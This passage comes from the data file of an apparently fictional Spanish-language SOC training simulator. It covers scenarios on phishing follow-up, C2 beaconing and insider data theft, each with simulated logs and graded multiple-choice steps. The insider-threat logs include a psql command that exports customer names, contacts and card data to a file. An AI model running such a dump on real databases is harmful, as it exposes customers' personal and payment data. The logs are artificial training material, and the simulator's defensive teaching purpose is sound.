        description: "Incidente documentado y escalado. ¿Qué sigue en tu flujo de trabajo?",
        hint: "Pensá en qué queda pendiente mientras otros equipos ejecutan la contención.",
        options: [
          {
            id: "a",
            label: "Cerrar el caso -- ya está todo documentado",
            correct: false,
            explanation: "Un caso de phishing con persistencia activa no se cierra sin verificar que: la cuenta fue desactivada, la workstation aislada, el usuario backdoor eliminado, y el crontab removido.",
            consequence: "En un SOC real, cerrar sin verificar remediación significa que el usuario \'svc-backdoor\' sigue activo y el crontab sigue ejecutando malware cada día a las 3 AM.",
          },
          {
            id: "b",
            label: "Volver al panel de logs para monitorear si hay más activity del atacante mientras DevOps ejecuta la contención",
            correct: true,
            explanation: "Correcto. Tu rol es vigilancia continua: ¿hay más workstations comprometidas? ¿el atacante tiene otros puntos de acceso? ¿la contención está funcionando? Mientras Ana ejecuta, vos monitoreás.",
          },
          {
            id: "c",
            label: "Ir a hablar con Sofía para entender por qué hizo clic en el enlace",
            correct: false,
            explanation: "La entrevista a la víctima es parte del proceso, pero no es prioridad durante la contención activa. Primero se contiene el incidente, luego se hace la entrevista para mejorar la concientización.",
            consequence: "En un SOC real, priorizar la entrevista sobre la contención da tiempo al atacante para instalar más persistencia o moverse a otros sistemas.",
          },
        ],
      },
    ],
    summary: "Phishing exitoso contra Sofía Ramírez resultó en robo de credenciales de dominio. El atacante usó las credenciales para acceder a srv-web-01, crear usuario backdoor 'svc-monitor', instalar crontab persistente, y descargar toolkit de explotación. Intento de lateral movement a srv-db-01 bloqueado por UFW. Clasificación: POSITIVO VERDADERO -- Compromiso con persistencia activa.",
  },

  {
    id: "c2-beaconing",
    title: "Beaconing a servidor de comando y control",
    severity: "critical",
    description: "Zeek y Suricata detectaron conexiones HTTPS periódicas desde srv-app-01 hacia una IP externa no registrada. Las conexiones ocurren cada 60 segundos con patrón de beaconing consistente, indicando posible malware C2 activo.",
    alertSource: "Zeek + Suricata SID 2024875",
    alertTime: "2026-08-24 11:30:00 UTC",
    logs: [
      { line: 1, timestamp: "Aug 24 10:00:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "info", flagged: false },
      { line: 2, timestamp: "Aug 24 10:01:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "info", flagged: false },
      { line: 3, timestamp: "Aug 24 10:02:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "info", flagged: false },
      { line: 4, timestamp: "Aug 24 10:03:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "info", flagged: false },
      { line: 5, timestamp: "Aug 24 10:04:00", source: "srv-app-01 nginx.access", message: "GET /api/health 200 -- 10.10.2.44 -- Lucía Fernández Dev", severity: "info", flagged: false },
      { line: 6, timestamp: "Aug 24 10:04:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "info", flagged: false },
      { line: 7, timestamp: "Aug 24 10:05:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "info", flagged: false },
      { line: 8, timestamp: "Aug 24 10:06:00", source: "srv-monitor cron", message: "Health check: srv-app-01 -- CPU 42% -- RAM 58% -- Disk 70%", severity: "info", flagged: false },
      { line: 9, timestamp: "Aug 24 10:06:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "info", flagged: false },
      { line: 10, timestamp: "Aug 24 10:07:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "info", flagged: false },
      { line: 11, timestamp: "Aug 24 10:08:00", source: "srv-app-01 nginx.access", message: "POST /api/payments/process 201 -- 10.10.3.22 -- Carlos Ruiz Corp", severity: "info", flagged: false },
      { line: 12, timestamp: "Aug 24 10:08:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "info", flagged: false },
      { line: 13, timestamp: "Aug 24 10:09:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "info", flagged: false },
      { line: 14, timestamp: "Aug 24 10:10:00", source: "srv-monitor cron", message: "Health check: srv-app-01 -- CPU 44% -- RAM 59% -- Disk 70%", severity: "info", flagged: false },
      { line: 15, timestamp: "Aug 24 10:10:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "info", flagged: false },
      { line: 16, timestamp: "Aug 24 10:11:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "info", flagged: false },
      { line: 17, timestamp: "Aug 24 10:12:00", source: "srv-web-01 nginx.access", message: "GET /api/health 200 -- 10.10.1.20 -- Diego López SOC", severity: "info", flagged: false },
      { line: 18, timestamp: "Aug 24 10:12:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "info", flagged: false },
      { line: 19, timestamp: "Aug 24 10:13:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "info", flagged: false },
      { line: 20, timestamp: "Aug 24 10:14:00", source: "srv-app-01 nginx.access", message: "GET /dashboard 200 -- 10.10.1.20 -- Diego López SOC", severity: "info", flagged: false },
      { line: 21, timestamp: "Aug 24 10:14:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "info", flagged: false },
      { line: 22, timestamp: "Aug 24 10:15:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "info", flagged: false },
      { line: 23, timestamp: "Aug 24 10:16:00", source: "srv-monitor cron", message: "Metric aggregation: 10,445 events -- avg latency 15ms", severity: "info", flagged: false },
      { line: 24, timestamp: "Aug 24 10:16:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "info", flagged: false },
      { line: 25, timestamp: "Aug 24 10:17:00", source: "srv-web-01 node.app", message: "Queue processor: 143 jobs completed, 21 pending", severity: "info", flagged: false },
      { line: 26, timestamp: "Aug 24 10:17:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "info", flagged: false },
      { line: 27, timestamp: "Aug 24 10:18:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "warning", flagged: true },
      { line: 28, timestamp: "Aug 24 10:19:00", source: "srv-app-01 nginx.access", message: "POST /api/auth/refresh 200 -- 10.10.3.10 -- Sofía Ramírez Ops", severity: "info", flagged: false },
      { line: 29, timestamp: "Aug 24 10:19:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "warning", flagged: true },
      { line: 30, timestamp: "Aug 24 10:20:00", source: "srv-app-01 node.app", message: "SSL certificate renewal check -- expires in 23 days", severity: "info", flagged: false },
      { line: 31, timestamp: "Aug 24 10:20:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "warning", flagged: true },
      { line: 32, timestamp: "Aug 24 10:21:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "warning", flagged: true },
      { line: 33, timestamp: "Aug 24 10:22:00", source: "srv-web-01 sshd[22701]", message: "Accepted publickey for lucia from 10.10.2.44 port 50401 ssh2", severity: "info", flagged: false },
      { line: 34, timestamp: "Aug 24 10:22:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "warning", flagged: true },
      { line: 35, timestamp: "Aug 24 10:23:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "warning", flagged: true },
      { line: 36, timestamp: "Aug 24 10:24:00", source: "srv-monitor cron", message: "Health check: srv-app-01 -- CPU 48% -- RAM 62% -- Disk 71%", severity: "info", flagged: false },
      { line: 37, timestamp: "Aug 24 10:24:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "warning", flagged: true },
      { line: 38, timestamp: "Aug 24 10:25:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "warning", flagged: true },
      { line: 39, timestamp: "Aug 24 10:26:00", source: "srv-web-01 nginx.access", message: "GET /api/products?page=2 200 -- 10.10.2.44 -- Lucía Fernández Dev", severity: "info", flagged: false },
      { line: 40, timestamp: "Aug 24 10:26:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "warning", flagged: true },
      { line: 41, timestamp: "Aug 24 10:27:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "warning", flagged: true },
      { line: 42, timestamp: "Aug 24 10:28:00", source: "srv-app-01 nginx.access", message: "POST /api/reports/generate 202 -- 10.10.1.15 -- Martin Gonzalez Admin", severity: "info", flagged: false },
      { line: 43, timestamp: "Aug 24 10:28:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "warning", flagged: true },
      { line: 44, timestamp: "Aug 24 10:29:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "warning", flagged: true },
      { line: 45, timestamp: "Aug 24 10:30:00", source: "srv-app-01 node.app", message: "Cache hit ratio: 89.3% -- Redis memory: 389MB/512MB", severity: "info", flagged: false },
      { line: 46, timestamp: "Aug 24 10:30:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "warning", flagged: true },
      { line: 47, timestamp: "Aug 24 10:31:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "critical", flagged: true },
      { line: 48, timestamp: "Aug 24 10:32:00", source: "srv-web-01 kernel", message: "[UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.10.1.10 PROTO=TCP SPT=2222 DPT=22", severity: "info", flagged: false },
      { line: 49, timestamp: "Aug 24 10:32:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "critical", flagged: true },
      { line: 50, timestamp: "Aug 24 10:33:00", source: "srv-monitor alert", message: "srv-app-01: SSL anomaly -- 50 connections to cdn-analytics.io (45.77.65.211) in 33 minutes -- periodic beaconing detected", severity: "critical", flagged: true },
      { line: 51, timestamp: "Aug 24 10:33:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "critical", flagged: true },
      { line: 52, timestamp: "Aug 24 10:34:00", source: "srv-web-01 sshd[22710]", message: "Accepted publickey for sofia from 10.10.3.10 port 50501 ssh2", severity: "info", flagged: false },
      { line: 53, timestamp: "Aug 24 10:34:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "critical", flagged: true },
      { line: 54, timestamp: "Aug 24 10:35:00", source: "srv-app-01 node.app", message: "Worker process restarted -- PID 29102 -- config reloaded", severity: "info", flagged: false },
      { line: 55, timestamp: "Aug 24 10:35:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "critical", flagged: true },
      { line: 56, timestamp: "Aug 24 10:36:00", source: "srv-web-01 nginx.access", message: "GET /api/health 200 -- 10.10.1.15 -- Martin Gonzalez Admin", severity: "info", flagged: false },
      { line: 57, timestamp: "Aug 24 10:36:05", source: "srv-app-01 zeek.ssl", message: "Connection: 10.10.1.40 -> 45.77.65.211:443 -- SSL established -- SNI: cdn-analytics.io -- JA3: a0e9f5d64349fb13191bc781f81f42e1", severity: "critical", flagged: true },
      { line: 58, timestamp: "Aug 24 11:30:00", source: "suricata alert", message: "[2024875] SSL/TLS connection to suspicious IP 45.77.65.211 from srv-app-01 (10.10.1.40) -- C2 beaconing pattern confirmed", severity: "critical", flagged: true },
    ],
    playbook: [],
    steps: [
      {
        id: "identify",
        title: "Paso 1 -- Identificar los logs relevantes",
        description: "Revisá el log de conexiones SSL. ¿Qué patrón ves en las conexiones a cdn-analytics.io?",
        hint: "Fijate en la frecuencia, el IP de destino, y el JA3 hash.",
        options: [
          {
            id: "a",
            label: "Conexiones normales de CDN -- srv-app-01 está descargando assets",
            correct: false,
            explanation: "Un CDN real tiene múltiples IPs, TTL variables, y no genera 50 conexiones idénticas cada 60 segundos al mismo IP con el mismo JA3. Este patrón es beaconing C2, no tráfico de CDN.",
            consequence: "En un SOC real, ignorar beaconing C2 como 'tráfico de CDN' permite que el malware siga comunicándose con el atacante, recibiendo comandos y exfiltrando datos silenciosamente.",
          },
          {
            id: "b",
            label: "Beaconing C2 -- conexiones periódicas cada 60 segundos al mismo IP con JA3 consistente",
            correct: true,
            explanation: "Correcto. 50+ conexiones al mismo IP (45.77.65.211) cada ~60 segundos, mismo JA3 hash, mismo SNI falso (cdn-analytics.io). El patrón temporal perfecto es Beaconing C2 clásico.",
          },
          {
            id: "c",
            label: "Ruido de red -- solo son conexiones SSL normales",
            correct: false,
            explanation: "50 conexiones idénticas en 33 minutos al mismo IP con el mismo JA3 no es ruido. Es un patrón temporal mecánico que indica Beaconing automatizado, no tráfico humano.",
            consequence: "En un SOC real, descartar beaconing C2 como \'ruido\' es uno de los errores más costosos. Cada beacon puede ser un comando del atacante o un paquete de datos robados.",
          },
          {
            id: "d",
            label: "Actualizaciones de software -- el servidor está descargando parches",
            correct: false,
            explanation: "Las actualizaciones de software no usan conexiones cada 60 segundos al mismo IP. Los updates van a servidores oficiales (Microsoft, Canonical, etc.), no a IPs desconocidas con SNI falso.",
            consequence: "En un SOC real, confundir beaconing C2 con actualizaciones legítimas es un error grave. Mientras el equipo 'verifica las actualizaciones', el atacante ejecuta comandos remotos en el servidor.",
          },
        ],
      },
      {
        id: "assign",
        title: "Paso 2 -- Asignar el incidente",
        description: "¿Quién debería tomar este caso? Un servidor de producción tiene Beaconing C2 activo.",
        hint: "Pensá en qué servidor está afectado y qué nivel de escalamiento requiere.",
        options: [
          {
            id: "a",
            label: "Lucía Fernández (Desarrolladora Backend) -- ella trabaja en srv-app-01",
            correct: false,
            explanation: "Lucía desarrolla la aplicación pero no tiene experiencia en respuesta a incidentes de seguridad. Podría ayudar a entender la aplicación, pero no es la primera línea de respuesta.",
            consequence: "En un SOC real, asignar un incidente C2 a un desarrollador sin formación en seguridad resulta en respuestas lentas e incorrectas. Ella puede Help entender la app, pero no puede bloquear IPs o aislar servidores.",
          },
          {
            id: "b",
            label: "Diego López (SOC L2) para investigación + Ana Martínez (DevOps) para contención + escalamiento a CISO",
            correct: true,
            explanation: "Correcto. C2 beaconing en srv-app-01 (servidor de pagos) es nivel 3: compromiso activo con potencial de exfiltración. Diego investiga, Ana contiene, CISO es notificado.",
          },
          {
            id: "c",
            label: "Sofía Ramírez (Gerente de Operaciones) -- que apruebe las acciones",
            correct: false,
            explanation: "Sofía no es parte de la cadena de respuesta técnica. Su involvement sería posterior para comunicaciones. La contención técnica no necesita aprobación gerencial inmediata.",
            consequence: "En un SOC real, requerir aprobación gerencial para contener C2 activo da al atacante horas extra de acceso. Cada beacon es un comando ejecutado en el servidor de pagos.",
          },
          {
            id: "d",
            label: "El equipo de desarrollo -- que revisen el código de la aplicación",
            correct: false,
            explanation: "Revisar código es una acción de remediación a largo plazo, no de contención inmediata. El servidor tiene Beaconing C2 activo y necesita contención ahora, no una revisión de código.",
            consequence: "En un SOC real, priorizar la revisión de código sobre la contención de C2 es como revisar las cerraduras mientras el ladrón sigue dentro de la casa.",
          },
        ],
      },
      {
        id: "playbook",
        title: "Paso 3 -- Consultar el playbook",
        description: "El playbook está vacío. ¿Cuál es la PRIMERA acción de contención para un servidor con Beaconing C2?",
        hint: "Pensá en cortar la comunicación con el atacante sin causar downtime.",
        options: [
          {
            id: "a",
            label: "Apagar srv-app-01 inmediatamente",
            correct: false,
            explanation: "Apagar un servidor de pagos en producción causa downtime directo y pérdida de ingresos. Además, destruye evidencia en memoria. La contención debe ser quirúrgica.",
            consequence: "En un SOC real, apagar un servidor de pagos causa pérdidas financieras por cada minuto de downtime, más daño reputacional con clientes que dependen del servicio.",
          },
          {
            id: "b",
            label: "Bloquear la IP 45.77.65.211 en el firewall perimetral y aislar srv-app-01 de la red externa",
            correct: true,
            explanation: "Correcto. La primera acción es cortar la comunicación C2 bloqueando la IP del atacante. Luego se aisla el servidor de la red externa mientras se investiga. El servicio interno se mantiene si es posible.",
          },
          {
            id: "c",
            label: "Reiniciar srv-app-01 para limpiar la memoria",
            correct: false,
            explanation: "Reiniciar puede eliminar el malware de la memoria temporalmente, pero sin aislar la IP C2, el malware se reactivará al reiniciar. Además, se pierde evidencia volátil en memoria.",
            consequence: "En un SOC real, reiniciar sin contención es inútil: el malware se re-descarga del C2 al reiniciar, y se pierde la evidencia de memoria que podría contener las credenciales del atacante.",
          },
          {
            id: "d",
            label: "Cambiar las credenciales de todos los usuarios del servidor",
            correct: false,
            explanation: "Cambiar credenciales no detiene la comunicación C2. El malware tiene su propio mecanismo de comunicación que no depende de credenciales de usuario. Primero se corta la comunicación.",
            consequence: "En un SOC real, cambiar credenciales sin cortar la conexión C2 es inútil: el malware sigue comunicándose con el atacante mientras 'rotás' contraseñas que no tiene relación con el canal C2.",
          },
        ],
      },
      {
        id: "classify",
        title: "Paso 4 -- Clasificar la alerta",
        description: "¿Cuál es la clasificación correcta de este incidente?",
        hint: "Considerá: beaconing periódico, IP no registrada, servidor de pagos, JA3 consistente.",
        options: [
          {
            id: "a",
            label: "Falso positivo -- puede ser tráfico legítimo de analytics",
            correct: false,
            explanation: "cdn-analytics.io no está registrado en el asset inventory. El dominio es falso y el IP (45.77.65.211) no pertenece a ningún proveedor de analytics conocido. 50 conexiones cada 60 segundos no es tráfico legítimo.",
            consequence: "En un SOC real, clasificar beaconing C2 como 'analytics legítimo' permite que el atacante siga ejecutando comandos remotos en el servidor de pagos, potencialmente robando datos de tarjetas de crédito.",
          },
          {
            id: "b",
            label: "Positivo verdadero -- Beaconing C2 confirmado con potencial de exfiltración",
            correct: true,
            explanation: "Correcto. IP no registrada + dominio falso + patrón temporal mecánico (60s) + JA3 consistente + servidor de pagos = C2 beaconing confirmado con riesgo alto de exfiltración.",
          },
          {
            id: "c",
            label: "Requiere más análisis -- necesitamos ver qué datos se transfirieron",
            correct: false,
            explanation: "La clasificación no requiere ver los datos transferidos. El beaconing C2 ya confirma compromiso activo. Los datos transferidos se investigan DURANTE la fase de contención, no para decidir si es real.",
            consequence: "En un SOC real, pedir evidencia de exfiltración antes de clasificar como positivo es un error: mientras buscás 'prueba de exfiltración', el atacante sigue exfiltrando datos cada 60 segundos.",
          },
        ],
      },
      {
        id: "writeup",
        title: "Paso 5 -- Redacción del reporte",
        description: "Escribí el reporte del incidente. ¿Cuál es la redacción correcta?",
        hint: "Incluí: beaconing, IP C2, dominio falso, servidor afectado, y acciones.",
        options: [
          {
            id: "a",
            label: "srv-app-01 tiene conexiones raras. Hay que revisar el servidor.",
            correct: false,
            explanation: "Demasiado vago. No menciona la IP C2, el dominio falso, el patrón temporal, ni las acciones de contención necesarias.",
            consequence: "En un SOC real, un reporte así no permite ninguna acción de contención. El equipo no sabe qué IP bloquear, qué servidor aislar, ni qué dominio monitorear.",
          },
          {
            id: "b",
            label: "Beaconing C2 detectado en srv-app-01 (10.10.1.40) hacia 45.77.65.211:443 (SNI: cdn-analytics.io -- dominio no registrado). 50+ conexiones SSL cada 60 segundos entre 10:00-11:30 UTC. JA3 hash consistente: a0e9f5d64349fb13191bc781f81f42e1. Servidor de pagos en producción. Impacto NIVEL 3: posible compromiso de datos de clientes. Acciones requeridas: bloquear 45.77.65.211 en firewall perimetral, aislar srv-app-01 de red externa, forense de memoria (RAM dump), revisar procesos activos, verificar integridad de datos de pagos.",
            correct: true,
            explanation: "Reporte completo: QUÉ (beaconing C2), DESDE DÓNDE (srv-app-01), HACIA DÓNDE (IP + dominio falso), PATRÓN (50+ conexiones cada 60s), JA3, SERVIDOR AFECTADO (pagos), IMPACTO, y ACCIONES concretas. Formato profesional SOC.",
          },
          {
            id: "c",
            label: "El servidor está hackeado y se está comunicando con un exterior. Hay que apagarlo.",
            correct: false,
            explanation: "Lenguaje alarmista sin datos técnicos. No hay IP, timestamp, patrón, ni plan de acción. 'Apagarlo' es una medida drástica sin análisis.",
            consequence: "En un SOC real, este tipo de reporte genera pánico y decisiones erróneas como apagar servidores críticos de producción sin forense previo.",
          },
        ],
      },
      {
        id: "return",
        title: "Paso 6 -- Volver al panel",
        description: "Incidente documentado y escalado. ¿Qué sigue en tu flujo de trabajo?",
        hint: "Pensá en qué queda pendiente mientras otros equipos ejecutan la contención.",
        options: [
          {
            id: "a",
            label: "Cerrar el caso -- ya está todo documentado",
            correct: false,
            explanation: "Un caso de C2 beaconing no se cierra sin verificar que la IP fue bloqueada, el servidor aislado, y el forense de memoria completado.",
            consequence: "En un SOC real, cerrar sin verificar que la IP C2 fue bloqueada significa que el atacante sigue comunicándose con el servidor mientras el equipo cree que 'ya está resuelto'.",
          },
          {
            id: "b",
            label: "Volver al panel de logs para monitorear si hay más servidores con Beaconing C2 mientras DevOps ejecuta la contención",
            correct: true,
            explanation: "Correcto. Tu rol es vigilancia continua: ¿hay más servidores comprometidos? ¿el atacante tiene otros puntos de acceso? ¿la contención está funcionando? Mientras Ana ejecuta, vos monitoreás.",
          },
          {
            id: "c",
            label: "Ir a revisar el servidor físicamente",
            correct: false,
            explanation: "Como SOC analyst, no deberías manipular evidencia físicamente. Eso es trabajo del equipo forense. Tu rol es análisis de logs, clasificación, y monitoreo continuo.",
            consequence: "En un SOC real, tocar el servidor sin protocolo forense puede alterar evidencia y comprometer la cadena de custodia para uso legal.",
          },
        ],
      },
    ],
    summary: "Beaconing C2 detectado en srv-app-01 (10.10.1.40) hacia 45.77.65.211:443 (cdn-analytics.io). 50+ conexiones SSL cada 60 segundos con JA3 consistente. Dominio no registrado en asset inventory. Servidor de pagos en producción. Clasificación: POSITIVO VERDADERO -- Beaconing C2 confirmado con riesgo de exfiltración.",
  },

  {
    id: "insider-threat",
    title: "Amenaza interna -- exfiltración de datos",
    severity: "high",
    description: "DLP detectó subida de archivos sensibles a un servicio cloud personal. Zeek HTTP y auditoría de base de datos confirman que Lucía Fernández (Desarrolladora Backend) está extrayendo datos de clientes de la base de datos y subiéndolos a su cuenta personal de Google Drive.",
    alertSource: "DLP + Zeek HTTP + DB Audit",
    alertTime: "2026-08-24 18:45:00 UTC",
    logs: [
      { line: 1, timestamp: "Aug 24 17:00:05", source: "srv-web-01 nginx.access", message: "GET /api/health 200 -- 10.10.2.44 -- Lucía Fernández Dev", severity: "info", flagged: false },
      { line: 2, timestamp: "Aug 24 17:01:10", source: "srv-db-01 sshd[1801]", message: "Accepted publickey for lucia from 10.10.2.44 port 50601 ssh2", severity: "info", flagged: false },
      { line: 3, timestamp: "Aug 24 17:02:00", source: "srv-db-01 audit.log", message: "EXECVE: uid=1002(lucia) cmd=/usr/bin/psql -U app_user production_db", severity: "info", flagged: false },
      { line: 4, timestamp: "Aug 24 17:03:15", source: "srv-monitor cron", message: "Health check: srv-db-01 -- CPU 12% -- RAM 45% -- Disk 65%", severity: "info", flagged: false },
      { line: 5, timestamp: "Aug 24 17:04:00", source: "srv-web-01 node.app", message: "Queue processor: 167 jobs completed, 23 pending", severity: "info", flagged: false },
      { line: 6, timestamp: "Aug 24 17:05:30", source: "srv-web-01 nginx.access", message: "POST /api/payments/process 201 -- 10.10.3.10 -- Sofía Ramírez Ops", severity: "info", flagged: false },
      { line: 7, timestamp: "Aug 24 17:06:00", source: "srv-monitor cron", message: "Metric aggregation: 8,934 events -- avg latency 13ms", severity: "info", flagged: false },
      { line: 8, timestamp: "Aug 24 17:07:15", source: "srv-db-01 audit.log", message: "EXECVE: uid=1002(lucia) cmd=/usr/bin/psql -U app_user production_db -c 'SELECT * FROM customers LIMIT 1000'", severity: "info", flagged: false },
      { line: 9, timestamp: "Aug 24 17:08:00", source: "srv-web-01 sshd[22801]", message: "Accepted publickey for martin from 10.10.1.15 port 50701 ssh2", severity: "info", flagged: false },
      { line: 10, timestamp: "Aug 24 17:09:30", source: "srv-web-01 nginx.access", message: "GET /api/orders/history 200 -- 10.10.3.22 -- Carlos Ruiz Corp", severity: "info", flagged: false },
      { line: 11, timestamp: "Aug 24 17:10:00", source: "srv-monitor cron", message: "Health check: srv-web-01 -- CPU 20% -- RAM 48% -- Disk 61%", severity: "info", flagged: false },
      { line: 12, timestamp: "Aug 24 17:11:15", source: "srv-db-01 audit.log", message: "EXECVE: uid=1002(lucia) cmd=/usr/bin/psql -U app_user production_db -c 'COPY (SELECT customer_id, name, email, phone, credit_card_last4, address FROM customers) TO '/tmp/customer_export.csv' WITH CSV HEADER'", severity: "warning", flagged: true },
      { line: 13, timestamp: "Aug 24 17:12:00", source: "srv-web-01 node.app", message: "SSL certificate renewal check -- expires in 18 days", severity: "info", flagged: false },
      { line: 14, timestamp: "Aug 24 17:13:30", source: "srv-web-01 nginx.access", message: "GET /dashboard 200 -- 10.10.1.20 -- Diego López SOC", severity: "info", flagged: false },
      { line: 15, timestamp: "Aug 24 17:14:00", source: "srv-db-01 audit.log", message: "EXECVE: uid=1002(lucia) cmd=/usr/bin/psql -U app_user production_db -c 'SELECT order_id, customer_id, amount, payment_method, card_number FROM orders WHERE year=2026'", severity: "warning", flagged: true },
      { line: 16, timestamp: "Aug 24 17:15:10", source: "srv-web-01 kernel", message: "[UFW BLOCK] IN=eth0 SRC=203.0.113.77 DST=10.10.1.10 PROTO=TCP SPT=4444 DPT=22", severity: "info", flagged: false },
